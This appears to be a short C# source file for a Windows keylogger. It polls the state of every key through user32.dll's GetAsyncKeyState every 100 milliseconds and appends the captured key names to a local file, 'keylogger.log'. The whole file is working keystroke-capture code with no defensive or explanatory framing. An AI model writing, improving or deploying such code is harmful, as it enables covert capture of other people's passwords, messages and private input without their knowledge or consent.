using System;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace key1
{
    class Program
    {
        [STAThread]
         [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(String[] args)
        {
            StartLoging();
        }

        static void StartLoging()
        {
            string buf = " ";
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        buf += ((Keys)i).ToString();
                        System.IO.File.AppendAllText("keylogger.log", buf);
                        buf = "";
                    }
                }
            }

        }
        

    }
}